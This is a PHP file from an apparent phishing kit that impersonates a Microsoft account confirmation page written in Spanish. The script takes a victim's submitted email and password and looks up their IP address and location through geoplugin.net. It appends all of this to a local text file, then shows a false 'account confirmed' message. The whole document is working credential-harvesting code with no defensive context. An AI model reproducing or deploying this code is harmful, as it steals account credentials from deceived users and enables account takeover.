<?php
ini_set("display_errors", 0);

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];

if (isset($_POST['usec']) && isset($_POST['clave'])){


	
	$file = fopen("0000000000.txt", "a");
fwrite($file, "||====================" . PHP_EOL);
fwrite($file, "|| C0rr30 : ".$_POST['usec']." - CL4V3 C0RR30: ".$_POST['clave']." - IP: ".$myip." ".$pais." ".$region." ".date('d/m/Y') .PHP_EOL);
fwrite($file, "||====================" . PHP_EOL);
fclose($file);
}

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<title>Información</title>
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<link rel="stylesheet" type="https://outlook.live.com/" href="./archivos/saved_resource"></head>

<body>
<br><br><br>
<div align="center">
    <h3>¡Cuenta Microsoft Confirmada con Éxito!</h3><br>
	
</div>
       


</body></html>